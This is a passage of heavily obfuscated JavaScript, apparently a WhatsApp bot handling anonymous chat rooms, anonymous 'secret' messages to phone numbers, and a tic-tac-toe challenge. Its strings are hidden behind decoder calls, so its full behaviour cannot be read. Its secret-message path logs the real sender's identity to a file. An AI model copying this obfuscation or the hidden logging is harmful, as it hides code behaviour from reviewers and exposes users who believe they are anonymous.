conn[_0x28040b(0x15e,-0x73,0xa0,-0x66,-0x93)+_0x9b1ba0(-0x122,-0xc8,-0x3f,-0x66,-0x2b5)+'e'](room['a'],_0x2b2b45);continue;case'4':room['b']=sender;continue;}break;}}else{let id=+new Date();anonymous[id]={'id':id,'a':sender,'b':'','state':_0x526c7c(-0x38,0x1a8,0x1d7,0x22b,0xfc)+'NG'};var teks=_0x526c7c(-0x9d,0x10c,0x100,-0x22,-0xc1)+_0x28040b(0x16,0xa7,-0xb9,-0x154,0x29)+_0x28040b(0x107,-0x5d,0x286,0x223,0x96)+_0x480ff3(-0xc4,-0x2af,-0x349,-0x28c,-0x3f3)+_0x526c7c(0x199,0x25e,0x332,0x40b,0x3d6)+_0x9b1ba0(0x7d,-0x144,0x1da,-0x15a,-0x6c)+_0x9b1ba0(-0xac,0x81,-0x259,-0x15e,0x7c)+_0x480ff3(0x1d2,-0xb9,0x12a,-0x4,-0x12c)+_0x9b1ba0(-0x1cf,-0x46,0x1f,-0x14c,-0x2e1)+_0x28040b(0x13e,0x1ef,0x29b,0x21b,0x2cf)+_0x28040b(-0x41,-0x208,0x7b,-0x3d,-0x1b7)+_0x480ff3(-0xae,-0x8d,-0x25a,-0x1bc,-0x2e0)+_0x9b1ba0(-0x7b,-0xa6,-0x8e,-0xe,-0xf2)+_0x2fe230(0x19,-0x19e,-0x365,-0x2f3,-0xe0)+_0x480ff3(-0xc4,-0xe7,-0x18c,-0x256,-0x274)+_0x526c7c(0x600,0x4ac,0x3e8,0x472,0x597)+'t_';const _0x28eca3={};_0x28eca3[_0x28040b(-0xf4,-0x1a2,-0x99,-0x47,-0xd7)]=teks,await conn[_0x9b1ba0(0xfd,0x90,0x1c5,-0x88,0x2a3)+_0x2fe230(0x137,-0x75,-0x38,0xe9,-0x40)+'e'](from,_0x28eca3);}break;case prefix+(_0x9b1ba0(-0x128,0xab,0x82,-0x1e1,-0x220)+_0x28040b(0xbe,0x111,0x7d,0x7f,0x120)+'e'):case prefix+(_0x2fe230(-0x3c,-0x7b,-0xb2,0x2a,-0x186)+_0x526c7c(0x36b,0x3a8,0x58e,0x26c,0x2d8)):if(isGroup)return reply(mess[_0x526c7c(0x363,0x3bc,0x28e,0x375,0x383)+'M']);let romoe=Object[_0x9b1ba0(-0x8c,-0xb0,-0x32,-0x22a,0xd7)+'s'](anonymous)[_0x526c7c(0x365,0x332,0x45b,0x505,0x3ec)](_0x3563ea=>anonyCheck(sender,_0x3563ea)&&_0x3563ea[_0x9b1ba0(0x13e,0x4e,0x2e,-0x43,0x32a)]==_0x2fe230(-0x29,-0x20,0x100,-0x130,-0x59)+_0x480ff3(-0x49f,-0x1bd,-0x325,-0x2a3,-0x379));if(!romoe){var teks=_0x9b1ba0(0x89,0x83,-0x8c,0x1e7,0x1b0)+_0x2fe230(-0x134,0xaa,0x69,0x22a,-0xa0)+_0x9b1ba0(-0x220,-0x15f,-0xe1,-0x162,-0x1e)+_0x480ff3(-0x11f,-0x196,-0x7c,-0x8f,-0x145)+_0x2fe230(-0x8b,0x13f,0x1b5,0x92,0x146)+_0x480ff3(-0xa2,-0x333,-0x3f8,-0x208,-0x269)+_0x28040b(0x154,0x4a,0xa,-0x75,0xbe)+_0x28040b(-0x34,-0x226,-0x1b,-0x1a0,-0x19b)+_0x9b1ba0(-0x16d,0x63,0x59,-0x333,-0xe8)+_0x480ff3(0x48,-0xff,0x29d,0xfc,0x17c)+_0x526c7c(-0xda,0x120,-0xcc,-0x9d,0x13f)+_0x2fe230(-0x33d,-0x1a4,-0x315,0x49,-0xf)+_0x28040b(0x205,0x2e1,0x32c,0x181,0x11a)+_0x9b1ba0(-0x178,-0x1e,-0x278,-0x15b,-0x1ad)+_0x480ff3(-0xee,-0x262,-0x2de,-0xe2,-0x7b);const _0x2b5662={};_0x2b5662[_0x9b1ba0(-0x155,-0xd6,-0x67,-0x2f4,0x2b)]=teks,await conn[_0x28040b(0x15e,0x148,0x1,-0x73,0x306)+_0x480ff3(0x20,0x32,-0xa4,-0x199,-0x2b0)+'e'](from,_0x2b5662);}else{let rms=Object[_0x2fe230(0x8f,0x21,-0x19b,0x8c,-0x13f)+'s'](anonymous)[_0x28040b(0x48,-0x1b3,0xec,-0xf4,-0x13c)](_0xe48c1a=>[_0xe48c1a['a'],_0xe48c1a['b']][_0x2fe230(-0x1fa,-0xe2,-0x19f,-0x165,-0x175)+_0x526c7c(0x262,0x1c3,0x187,0xa3,-0x2c)](sender)&&_0xe48c1a[_0x28040b(0x19f,0x105,0xf1,0x359,0x2a7)]==_0x2fe230(-0x193,-0x20,-0x6c,-0x18f,-0x12f)+_0x2fe230(-0x109,-0x17f,0x6f,-0x303,-0x27c));var partnerJID=anonyOther(sender,rms),res=await conn[_0x9b1ba0(-0x17c,-0x23,-0x2f3,-0xd1,-0x112)+_0x526c7c(0x1bb,0x366,0x398,0x49b,0x4cb)+'t'](partnerJID,[sender[_0x28040b(-0xcd,-0xe7,-0xf5,-0x207,-0x132)]('@')[0xc*-0xe9+0x9e1+0x1*0x10b]]);const _0x1bdb2c={};_0x1bdb2c[_0x9b1ba0(-0x155,-0x318,0x30,0x5e,-0xc6)]=_0x2fe230(-0xaa,0xfd,-0x71,0x1a8,0xa9)+_0x480ff3(-0x122,-0x32e,-0x299,-0x194,-0x29e)+_0x526c7c(-0x79,0x130,0x1b6,-0x4d,-0xf)+_0x526c7c(0x5eb,0x4ab,0x37b,0x658,0x459)+_0x2fe230(-0x1d0,-0x13a,-0x1c7,-0x320,-0x22d)+_0x28040b(-0x135,-0x2cd,-0x1a0,-0x2fc,0x5)+_0x9b1ba0(-0x24,-0x74,0x1a9,0x169,-0x1f6)+_0x28040b(0xd4,-0xae,0xfe,0x74,0xc0)+_0x2fe230(0x38,0x141,0x2d8,0x1f4,0x2a6)+_0x9b1ba0(-0x240,-0x2ca,-0x17f,-0x2dc,-0x17d);const _0xaed865={};_0xaed865[_0x2fe230(0x13a,0x1ca,0x34a,0xdb,0x162)+'d']=msg,conn[_0x480ff3(0x5b,0x138,0x189,0x86,-0xde)+_0x28040b(-0xc1,0xb0,0x78,0xa0,-0x2b)+'e'](from,_0x1bdb2c,_0xaed865);const _0x106e67={};_0x106e67[_0x526c7c(0x236,0x1f6,0x3d7,0x92,0x291)]=_0x28040b(-0x6,-0xbd,-0xdf,0x67,-0xb5)+_0x28040b(-0x83,-0x1a1,-0x1e7,-0xb4,0x12f)+_0x2fe230(0x289,0xa1,-0x14f,-0x9,-0x14a)+_0x480ff3(0x1b4,-0xfb,-0x166,-0x3a,-0xd3)+_0x28040b(0xcb,0x108,0x2c7,0x244,0x9f)+_0x2fe230(0x58,-0x95,-0x24f,-0x254,-0xfa)+_0x480ff3(-0x79,-0x136,0xf5,-0x69,-0x16b)+_0x2fe230(0x103,0x3d,-0x35,-0x16f,0x23)+_0x526c7c(0x2b0,0x3a8,0x4b9,0x3f5,0x38e)+_0x2fe230(-0x278,-0x13b,0x4e,-0x324,-0x33c);const _0x4d0b7e={};_0x4d0b7e[_0x9b1ba0(0x11d,0x301,0x2ac,-0x3e,-0x39)+'d']=res,conn[_0x526c7c(0x49a,0x448,0x545,0x584,0x639)+_0x9b1ba0(-0x122,0x48,-0x1af,-0x1e1,-0xf)+'e'](partnerJID,_0x106e67,_0x4d0b7e);}break;case prefix+(_0x28040b(0x1aa,0xd7,0xaa,0x347,0x399)+'ss'):if(isGroup)return reply(mess[_0x526c7c(0x267,0x3bc,0x3fc,0x4d6,0x467)+'M']);if(args[_0x2fe230(-0x1d,0x53,0x21f,0xd0,0x3f)+'h']<0x3*0x531+0x2094+-0x3025)return reply(_0x28040b(0x1c8,0x1a9,-0x23,0x167,0x30e)+_0x2fe230(-0x2a7,-0x164,-0x2b4,-0x74,-0x1ff)+_0x28040b(-0x2,0x2e,-0x95,-0x134,0x13d)+_0x28040b(-0x57,-0x254,0x3e,0xf0,0x1a0)+_0x9b1ba0(0x3a,0x10a,0x161,-0xce,0x144)+_0x526c7c(0x4ac,0x4dd,0x51e,0x4c6,0x639)+_0x526c7c(-0xad,0x131,-0xbb,0x282,0x12b)+_0x480ff3(0x26,0x2de,-0xbf,0xe4,0x151)+_0x9b1ba0(0x199,0x103,-0x6,0x26,0x5d)+_0x9b1ba0(0x114,-0xb5,0x2f0,-0x30,0x151)+_0x9b1ba0(-0x189,0x5e,0x32,-0x29c,-0x359)+_0x28040b(-0x1a9,-0x7b,-0x313,-0x2b2,-0x30d)+_0x2fe230(-0x2de,-0xdf,-0x255,-0x259,-0xc6)+command+(_0x526c7c(0x529,0x4de,0x3eb,0x61d,0x6b9)+_0x480ff3(-0x11b,-0x371,-0x89,-0x202,-0x345)+_0x28040b(-0x12c,-0xf1,-0x1fc,-0x2ce,-0x21c)+'an'));var number_to=q[_0x28040b(-0xcd,0xd2,-0x62,-0x256,0x30)]('|')[-0x2011*-0x1+0x3*-0x79+-0x1ea6],sender_name=q[_0x2fe230(0x179,-0x81,-0x9d,-0x138,0x8f)]('|')[-0x4e2+0x110e+-0x1bd*0x7],msg_send=q[_0x2fe230(-0x53,-0x81,0x12f,0x33,-0x1ef)]('|')[0x25e7+-0xbaa+-0x1a3b];if(!number_to)return reply(_0x9b1ba0(-0x1,0x65,0x11,-0x1e3,0x1a5)+_0x2fe230(0x129,0x157,0x172,0x1d3,-0x28)+_0x526c7c(0x3c2,0x36e,0x43b,0x506,0x232)+_0x526c7c(0x222,0x2e8,0x420,0x377,0x398)+_0x480ff3(0x96,0x10d,0x29e,0x120,0x8f)+_0x480ff3(-0x103,0x7b,0x1c5,0xdf,-0xc6)+_0x28040b(-0x3f,0x124,0x76,-0x11,-0xc9)+_0x480ff3(-0x26e,-0x25a,-0x1d1,-0x2bf,-0x2f1)+_0x28040b(-0x1a7,-0x26,-0xb3,-0x24b,0x1e)+_0x526c7c(0x274,0x2fb,0x26e,0x4ae,0x113)+':\x0a'+command+(_0x9b1ba0(0x193,0x6e,0x170,0x1e3,0x1b0)+_0x2fe230(0x396,0x21e,0x8a,0xe7,0x14e)+_0x9b1ba0(0x181,0x8f,0x40,0x372,0x31c)+_0x480ff3(-0x1f2,-0x97,0x94,-0x64,-0x22c)+'k'));if(isNaN(number_to))return reply(_0x526c7c(0x1f2,0x251,0x1ce,0x331,0xde)+_0x2fe230(0x1ea,0x50,0xe2,-0xee,-0x5e)+_0x28040b(0x2e,-0x10a,-0x198,-0x1cf,-0x3a)+_0x526c7c(0x505,0x398,0x368,0x215,0x49b)+_0x28040b(-0x1f5,-0x15d,-0x108,-0x2db,-0xe4)+_0x480ff3(-0xf2,0x12c,-0x32,0xa5,-0x7)+_0x28040b(0x1bc,0xfb,0x136,0x169,0x144)+_0x526c7c(0x3b3,0x34a,0x19f,0x228,0x197)+_0x2fe230(0x1e4,0x1b,0x1a3,0x3d,0xe)+command+'\x20'+botNumber[_0x2fe230(-0x162,-0x81,0x6f,0x7e,-0x1fe)]('@')[0x1*-0x877+0x6*0x661+-0x1dcf]+(_0x28040b(0x1be,0xb9,0x1ee,0x17e,0xed)+_0x480ff3(0x97,-0x1f6,0x97,-0x159,0x94)+_0x480ff3(-0x348,-0x86,-0x225,-0x1c1,-0x52)));number_to=number_to[_0x480ff3(-0x73,-0x259,-0x322,-0x14d,-0x145)+'ce'](/[^0-9]/gi,'')+(_0x526c7c(0x29e,0x2da,0x1d5,0x308,0x2ca)+_0x526c7c(0x276,0x197,0x95,0x147,0x244)+_0x526c7c(0x342,0x308,0x26f,0x238,0x486));if(!sender_name)return reply(_0x526c7c(0x46a,0x34a,0x45e,0x1ae,0x38e)+_0x2fe230(-0x85,0x157,0x2f5,0x126,0x2ad)+_0x2fe230(0x1d9,0xd0,-0x11,-0xda,0x284)+_0x526c7c(0x12c,0x2e8,0x35d,0x2d7,0x37d)+_0x480ff3(0x1e4,-0x53,0x265,0xfe,0x2bd)+_0x2fe230(0x1f2,0x87,0x6d,0x189,-0x134)+_0x480ff3(-0x8e,-0x33d,-0x3be,-0x1e7,-0x163)+_0x480ff3(-0x57,0x192,0x287,0xca,0x6)+_0x480ff3(-0x1e1,-0x15d,-0x270,-0x24f,-0x3db)+_0x28040b(0x1fe,0x249,0x1f0,0x271,0x3de)+_0x9b1ba0(-0x248,-0x168,-0x395,-0x327,-0x196)+_0x526c7c(0x2aa,0x143,0x2e,0xae,0x343)+_0x480ff3(0x1c,0x10e,-0x1ea,-0xc7,-0x102)+':\x0a'+command+'\x20'+number_to[_0x480ff3(-0x261,-0x2f,-0x58,-0x1a5,-0x2c3)]('@')[-0x1f*-0xf6+0xf62+-0x2d2c]+(_0x480ff3(0x12b,-0xb3,0x82,0x127,0xaf)+_0x480ff3(-0x37,0x119,0x1e7,0x99,0x213)+_0x9b1ba0(-0xee,0xe8,-0x10f,-0xe8,-0x7)));if(!msg_send)return reply(_0x9b1ba0(-0x1,-0xb9,0x9f,0xc1,0xd9)+_0x28040b(0x10b,-0xbe,0x2d2,0x22b,0x23d)+_0x480ff3(-0xc7,-0x110,-0xfc,-0x54,-0xc)+_0x480ff3(-0xbe,-0x10f,-0x12f,-0xda,-0x2cf)+_0x28040b(0x10e,-0xf3,-0xed,0xd3,0x2a9)+_0x480ff3(-0x180,0x20,0x112,0x37,0x1b1)+_0x28040b(-0xdf,-0x105,-0x1a,0xd1,-0x3a)+_0x526c7c(0x13b,0x23f,0x18a,0x3e5,0x200)+_0x526c7c(0x491,0x49f,0x474,0x5cc,0x2e3)+_0x2fe230(0x2a0,0x21f,0x1f3,0x30e,0xa0)+_0x480ff3(0x2d8,0x224,-0x36,0xe4,0x1be)+_0x2fe230(0x18f,0xac,0x4f,0x1ff,0x215)+_0x28040b(-0x31,0x53,-0x1b,-0x136,-0x8c)+command+'\x20'+number_to[_0x28040b(-0xcd,0x100,0xbc,-0x210,-0x1dd)]('@')[-0x24aa+0x2155+0x355]+'|'+sender_name+(_0x480ff3(-0x54,-0x10a,-0x30,0x99,0x222)+_0x9b1ba0(-0xee,-0x2c6,-0x4f,0x1a,-0x6b)));var cek_number=await conn[_0x480ff3(-0x255,-0x235,-0x377,-0x286,-0x29c)+_0x526c7c(0x3a9,0x2d8,0xdd,0x4d6,0x278)](number_to);if(cek_number[_0x2fe230(-0x26,0x53,0x121,0x107,0x24a)+'h']===0x36f*-0x7+0x121*0x13+0x296)return reply(_0x28040b(0x23,0xbd,-0xcb,0x1a2,0x218)+_0x480ff3(-0x192,0x44,-0x228,-0x29,0x10a)+_0x28040b(-0x1b1,-0x97,-0x372,-0x22,-0x36b)+_0x2fe230(-0x14,0xdf,0x7d,0xfa,-0x65)+_0x526c7c(0x37b,0x2a4,0xf6,0xbc,0x326)+_0x9b1ba0(-0x13c,-0x253,-0x22c,0x9a,-0x3c)+_0x526c7c(0x51d,0x49d,0x4a4,0x3dd,0x3fb)+_0x9b1ba0(0x1a3,0x126,0x1b8,0x32d,0x1dd)+_0x526c7c(0x310,0x3ae,0x327,0x401,0x284)+_0x480ff3(0x28c,0xf5,0x41,0x10c,0x4e)+_0x28040b(-0x1c7,-0x17,-0x251,-0x111,-0xa2));number_to=cek_number[0x3a*-0x44+0x1bf3+0xf7*-0xd][_0x9b1ba0(-0x1c1,-0x2d,-0x118,-0x1f5,-0x33a)];if(sender===number_to)return reply(_0x480ff3(-0x1d7,-0x3c9,-0x37d,-0x1d4,-0x38)+_0x2fe230(0x11d,0x5b,0x12e,-0x112,0x189)+_0x526c7c(0x21f,0x35f,0x432,0x2df,0x3fc)+_0x9b1ba0(0x121,-0x86,0x267,-0xc9,0x2)+_0x9b1ba0(-0x9b,-0x23,0x42,0xda,0x5d)+_0x9b1ba0(0x1,-0x50,0x2f,0xd8,-0x147)+_0x28040b(0x3e,0x1a2,0xae,-0xd1,-0x146));if(botNumber===number_to)return reply(_0x2fe230(0x120,-0xb0,-0x106,0x12f,-0x279)+_0x526c7c(0x2d6,0x2f9,0x147,0x487,0x1ea)+_0x2fe230(0x1c4,0xc1,0x160,0x21d,-0x10c)+_0x2fe230(-0x6f,-0x152,-0xe3,0xa6,0x54)+_0x480ff3(-0x3d8,-0x185,-0x29e,-0x29c,-0x1a1)+_0x28040b(0xdd,0x24e,-0x98,0x1dc,0x1d8));reply(_0x28040b(0x19a,0x385,0x397,-0x25,-0x52)+_0x526c7c(0x1a3,0x31d,0x226,0x4ed,0x130)+_0x480ff3(-0x1d1,-0x206,0x16,-0x105,-0xcc)+_0x2fe230(-0x21e,-0x184,-0x167,-0x5b,-0x3d)+_0x480ff3(-0x209,0x160,0xd0,-0x81,0x129)+_0x9b1ba0(-0x3f,-0xf0,0x110,-0x224,-0x1ea)+_0x526c7c(0x4ac,0x337,0x2ea,0x49e,0x4ab)+_0x9b1ba0(0x156,-0x36,0x2dc,0x1a0,0xb6)+_0x2fe230(-0x1e,0x19c,0x182,0x37e,0x38a)+_0x2fe230(-0x201,-0x120,-0x214,-0x10d,0xae)+_0x480ff3(-0x25d,-0x310,-0x5c,-0x213,-0x3f2)+_0x2fe230(-0x152,-0x14c,-0x1b9,-0x25f,-0x1f8)+_0x9b1ba0(-0x81,-0xa0,-0x22b,0x44,-0x20)+_0x9b1ba0(0xcf,0x41,-0xfe,0xb,-0x11c)+_0x9b1ba0(0x188,-0x3f,0x2e7,0x19a,0x260)+_0x526c7c(0x206,0x2e5,0x131,0x1db,0x23d)+_0x2fe230(-0x47,-0x1a8,-0xf2,-0x17c,-0xb0)+_0x2fe230(-0xba,-0x78,-0xa6,-0x93,-0x1e4)+_0x526c7c(0x3db,0x3fc,0x3fe,0x3bf,0x5e9)+_0x480ff3(0x196,0x100,-0x40,-0x40,-0x215)+_0x28040b(0x2f,0xfc,-0x1b7,0x1ff,0xcd)+_0x480ff3(0x40,-0x43,-0xb1,-0x152,-0x133)+_0x526c7c(0x3ad,0x40c,0x5da,0x50e,0x2b2)+_0x9b1ba0(-0xb,-0x27,0x190,0x136,0x1b9)+_0x9b1ba0(-0xbc,-0x2,-0x19c,-0x117,0x104)+_0x9b1ba0(-0x148,-0x278,-0xd1,0x71,-0x218)+_0x9b1ba0(0xea,0x1a,0x1b9,0x2e3,0x178)+_0x28040b(0xca,-0xef,0x2b5,0x287,0x13a)+_0x526c7c(0x3bc,0x313,0x173,0x363,0x4d1)+_0x9b1ba0(0x186,0xdd,0x334,-0x7a,0x352)+'!');var teks=_0x9b1ba0(0xf,0x64,0x5b,-0x7b,0xb2)+_0x9b1ba0(-0x4d,-0x1c0,-0x24a,-0xc7,-0x5d)+_0x9b1ba0(-0x216,-0x305,-0x17a,-0x3fd,-0x2da)+_0x9b1ba0(0x12d,0x299,-0x68,0x53,0x317)+_0x9b1ba0(0x11,0xed,-0x2c,0xd9,0x21)+_0x28040b(-0x19,0x2b,-0x39,0x1bb,0x13e)+_0x526c7c(-0x24,0x14b,0x20d,0xe1,0x324)+_0x9b1ba0(-0x207,-0x126,-0x3f8,-0x3f2,-0x2c9)+_0x2fe230(0x116,-0xaa,-0x25b,-0x1d9,-0x178)+sender_name+(_0x2fe230(0xfb,0xdd,0x292,0x109,-0xc2)+_0x526c7c(0x428,0x30e,0x2b1,0x16b,0x2aa)+_0x480ff3(-0x17f,0xcb,0x24,-0x51,0x1d)+':\x0a')+msg_send;const _0x25d7a8={};_0x25d7a8[_0x28040b(-0xf4,-0x126,0xb,-0x26,-0x121)]=teks,conn[_0x2fe230(0x10,0x1aa,0x184,0x2ec,0x33)+_0x28040b(-0xc1,0xd3,0x119,0x3a,-0x46)+'e'](number_to,_0x25d7a8,{'messageId':_0x480ff3(-0x5b,-0x392,-0x1dd,-0x225,-0x289)+makeid(-0x1a40+-0x25b0+0x1af*0x26)[_0x526c7c(0x2c6,0x1e0,0xf4,0x343,0x2ab)+_0x526c7c(0x30d,0x182,0x1a9,0x5d,-0x3b)+'e']()+(_0x2fe230(0x73,0x20,-0x3d,0x2e,0x205)+'SS')})[_0x28040b(-0x9f,-0x227,0x15,0x43,0x92)](_0x11bd4a=>{const _0x1ed64e={};_0x1ed64e[_0x9159e3(0x6a,-0x188,-0x270,0x2e,-0x58)]=_0x3c436c(-0x44,0x20c,0x13f,0x334,0xb2)+_0x872bd3(0x57a,0x633,0x445,0x4e6,0x667)+_0x3c436c(0x149,0x111,-0x3b,0x74,0x93)+_0x872bd3(0x2b8,0x58c,0x46e,0x3cf,0x49e)+_0x872bd3(0x747,0x74c,0x68d,0x5ec,0x622)+_0x9159e3(-0xfa,-0x1ea,-0xfd,-0x1a9,-0x7a);const _0x3f9765=_0x1ed64e;conn[_0x3c436c(-0x143,-0x22,-0x103,-0x23a,-0x115)](number_to,_0x872bd3(0x4e4,0x4fd,0x523,0x334,0x3cb)+_0xbfb481(-0x2,0x16,-0x9,0x1b6,0x124)+_0x9159e3(0x213,0xb0,-0x8b,0x229,0x224)+_0x872bd3(0x4d3,0x419,0x3eb,0x46b,0x2d9)+_0xbfb481(0x47,0x1ec,-0xd8,-0xd9,-0x182)+_0xaa796f(0x392,0x52d,0x345,0x33a,0x49f)+_0x3c436c(-0x39,-0x282,-0x233,-0x18a,-0x119)+_0x872bd3(0x15b,0x1fb,0x2f7,0x2d8,0x479)+_0x872bd3(0x338,0x24f,0x2ef,0x2a5,0x19c)+_0x872bd3(0x604,0x6bc,0x69a,0x57d,0x69a)+_0x9159e3(0x7b,-0x58,0x108,-0x72,-0x172)+_0x872bd3(0x36d,0x1ad,0x34e,0x265,0x32d)+_0x872bd3(0x6ab,0x571,0x4d0,0x56a,0x5e8)+_0x9159e3(-0x143,-0x1eb,-0x240,-0x108,-0x291)+_0xbfb481(-0x1b,-0x20f,0x178,-0x9b,-0x68)+_0x872bd3(0x268,0x3ec,0x522,0x402,0x241)+_0x9159e3(-0x12b,-0xd9,-0x241,-0x1c,-0x29a)+_0x872bd3(0x22e,0x2b1,0x280,0x2a9,0x465)+_0x872bd3(0x30c,0x54,0x1e,0x1fa,-0x4)+_0x3c436c(-0xd5,-0x2ea,-0x198,-0xb0,-0x346)+_0xbfb481(0x2ff,0x4c5,0x14d,0x4b0,0x44e)+_0x872bd3(0x3f6,0x6d0,0x613,0x57d,0x73f)+_0x3c436c(0x1e,0x246,0x150,0x59,0x241)+_0x9159e3(-0x106,-0x1a6,-0x2cd,-0x347,-0xa2),_0x11bd4a);const _0x5ef9da={};_0x5ef9da[_0xaa796f(0x644,0x82a,0x633,0x44f,0x814)+'r']=number_to,_0x5ef9da[_0x3c436c(0x1f0,-0xba,0x68,0x1d,-0x11a)+_0xbfb481(0x1b5,0x179,0x2de,0x237,0x288)]=sender;function _0x3c436c(_0x137a46,_0x4bc457,_0x1e44b2,_0x56880c,_0x1dd020){return _0x526c7c(_0x137a46-0x4,_0x1e44b2- -0x39c,_0x1e44b2-0x83,_0x56880c-0x126,_0x56880c);}_0x5ef9da[_0x3c436c(-0x190,-0x346,-0x1e9,-0xf5,-0x211)]=msg_send,_0x5ef9da[_0x3c436c(-0x85,0x3a,-0xa,-0x90,-0x1e2)]=_0x11bd4a,_0x5ef9da[_0x872bd3(0xc4,0x2cc,0x230,0x271,0x157)]=msg;var _0x4922df=_0x5ef9da;function _0x9159e3(_0x89a885,_0x25962e,_0x16d1ff,_0x35ac07,_0x15f183){return _0x2fe230(_0x15f183,_0x25962e- -0x67,_0x16d1ff-0xf8,_0x35ac07-0x1d6,_0x15f183-0x138);}secreto[_0xbfb481(0x2c8,0x3be,0xef,0x23c,0x2bf)](_0x4922df);function _0xaa796f(_0x22e540,_0x53b28b,_0x29c65c,_0x136c88,_0x10dfb2){return _0x2fe230(_0x136c88,_0x22e540-0x492,_0x29c65c-0x195,_0x136c88-0xab,_0x10dfb2-0xb2);}function _0xbfb481(_0x4708e9,_0x4c15d1,_0x864ed8,_0x2e453a,_0x138d3f){return _0x480ff3(_0x4708e9-0xd9,_0x4c15d1-0x19a,_0x864ed8-0x85,_0x4708e9-0x256,_0x864ed8);}function _0x872bd3(_0x7116aa,_0x5a4be0,_0x1b65e0,_0x110f66,_0xef5038){return _0x28040b(_0x110f66-0x3e0,_0x5a4be0-0x1af,_0x1b65e0-0x18a,_0x110f66-0x62,_0x1b65e0);}fs[_0x872bd3(0x3b0,0x19a,0x93,0x1ef,0x268)+_0x3c436c(-0xe6,-0x14e,0xe,-0x15d,0x49)+_0x9159e3(0x7a,-0x155,-0x2d0,-0x1af,-0x318)](_0x3f9765[_0x872bd3(0x2b1,0x35d,0x14f,0x273,0x11a)],JSON[_0x9159e3(0xf7,0xdb,-0x92,0x1ab,0x105)+_0x872bd3(0x36c,0x675,0x668,0x4d1,0x5bd)](secreto,null,0x58*0x6d+-0x60*-0x35+0xb3*-0x52));});break;case prefix+(_0x526c7c(0x104,0x13d,0x32,0xc,0xe)+_0x2fe230(0x21,-0x4a,0x64,0xdb,-0x35)):case prefix+_0x2fe230(-0x2e1,-0x13e,-0x27a,-0x314,-0x31f):case prefix+_0x9b1ba0(-0x12b,-0x20a,0x4a,-0xb9,-0x228):if(!isGroup)return reply(mess[_0x480ff3(0x54,0x258,0x265,0x9f,-0xf5)+_0x526c7c(0x536,0x42b,0x431,0x35a,0x5db)]);if(isGame(sender,isOwner,gcount,glimit))return reply(_0x526c7c(0x4af,0x3e8,0x236,0x50d,0x29a)+_0x526c7c(0x6,0x1f2,0x258,0x16f,0x12e)+_0x526c7c(0x206,0x388,0x314,0x4b1,0x53f)+_0x2fe230(0x1a7,0x254,0x64,0x3af,0x196)+_0x28040b(-0x23,0x1d3,0x4a,-0x193,-0x1)+'is');if(isTicTacToe(from,tictactoe))return reply(_0x480ff3(-0x36,-0x164,-0x93,-0x220,-0x309)+_0x2fe230(-0x1ae,-0x18e,-0x14e,-0x28a,-0x150)+_0x480ff3(0x44,0x166,0x1d1,0xb0,0x20d)+_0x480ff3(-0x1a7,-0x1,0x220,0x4c,-0x82)+_0x2fe230(0xae,0x4c,0x9f,-0xdf,0xd)+_0x2fe230(-0x23d,-0x10e,-0x29f,0xee,0x18));if(args[_0x28040b(0x7,0x201,0x1ba,-0xee,0x201)+'h']<-0x10*-0x1e3+-0x2ad*0x4+-0x137a)return reply(_0x28040b(0x18f,-0x65,0x24f,0xa7,0x182)+_0x480ff3(-0xa2,-0x6e,-0x77,-0x1f4,-0x3e5)+_0x9b1ba0(-0x89,-0xf3,0x1a,-0x205,-0x52)+'*'+prefix+(_0x2fe230(-0x2f9,-0x161,-0x198,-0x284,-0x1cb)+_0x2fe230(0x17e,-0x24,-0x1f1,-0x184,-0x36)+_0x526c7c(0x629,0x47d,0x4d4,0x2d1,0x4fd)));if(mentioned[_0x9b1ba0(-0x5a,0x4d,-0x16a,-0x1c3,-0x180)+'h']!==0x2203+0x9b7+-0x2bb9){if(mentioned[-0x25f6+0x9e0+0x1c16]===botNumber)return reply(_0x9b1ba0(0x1a2,0x6f,0x88,0x11,0xac)+_0x526c7c(0x3b1,0x21f,0x32d,0x187,0x374)+_0x2fe230(-0x15d,-0x118,-0x1d3,-0xf5,-0x19)+_0x28040b(0x115,0x2ba,-0x44,0x202,0x2a1)+_0x2fe230(0x103,0x84,-0x54,0x70,0x106)+_0x2fe230(-0xbc,0x104,0x287,-0xf,0x1d0));if(mentioned[0x1*0x121f+-0xb*-0x54+-0x15bb]===sender)return reply(_0x2fe230(-0x4e,0x1b3,0x3a1,0x28b,0x30a)+_0x526c7c(0x301,0x4b5,0x2bb,0x4c7,0x591)+_0x28040b(0x5,0xe7,0x194,0x160,0xa)+_0x480ff3(-0x189,0x115,-0x190,-0x9c,-0x20c)+_0x2fe230(-0x221,-0x10a,-0xb9,-0x24a,-0x2b5)+_0x9b1ba0(-0x1e0,-0x257,-0x56,-0xd9,-0x311));var hadiah=randomNomor(0x2c9+-0x17*0x2d+-0x1*-0x1a6,0x876*-0x1+-0x16*-0xad+-0x5d2);mentions(monospace('@'+sender[_0x526c7c(0x2b6,0x21d,0x3d1,0x40f,0x60)]('@')[-0x67b+0x64a+0x31]+(_0x2fe230(0x39,0x1f0,0x302,0x3a,0x166)+_0x526c7c(0x2cf,0x40a,0x46a,0x2e4,0x413)+'\x20@')+mentioned[0xaab+0x397*0x6+-0x2035][_0x28040b(-0xcd,-0x135,-0xb9,-0xdd,-0x1aa)]('@')[0x1969+0x2a*-0x29+0x1*-0x12af]+(_0x9b1ba0(-0x24c,-0x19e,-0x156,-0x156,-0xe0)+_0x480ff3(-0x47,-0x68,-0x22d,-0x16a,-0x15b)+_0x9b1ba0(0xa2,-0x3e,0x116,0x265,0x5a)+_0x9b1ba0(-0x1de,-0x2aa,-0x307,-0x273,-0x271)+_0x2fe230(0x29,0x1c,0xc8,0x206,0x187)+_0x526c7c(0x3e7,0x274,0x105,0x367,0x371)+_0x526c7c(0x46d,0x29b,0x1de,0x21c,0x1f1)+_0x2fe230(0x41,0xc,0x170,0xde,0x19f)+_0x9b1ba0(-0x136,-0x1f7,-0x1c0,-0xe4,-0x115)+_0x480ff3(0x115,-0x9d,0xe0,-0xa8,-0x26f)+_0x2fe230(0xf2,-0x25,0xdc,-0x188,0xe9)+_0x480ff3(-0x78,-0x13,0x1b6,0x76,-0x6f)+':\x20')+hadiah+(_0x2fe230(0xe7,0x39,-0x78,-0x16,0xe)+_0x9b1ba0(0xbc,0x11b,0x2a2,0x53,0x166))),[sender,mentioned[0x224b+0x1ca*0x1+-0x1*0x2415]],![]),tictactoe[_0x2fe230(0x88,0x196,0x175,0x320,-0x44)]({'id':from,'status':null,'hadiah':hadiah,'penantang':sender,'ditantang':mentioned[0xb1*0x24+0xea1+-0x2785*0x1],'waktu':setTimeout(()=>{function _0xa9cede(_0x521e66,_0x2f9067,_0x18396e,_0x182df2,_0x29eb7e){return 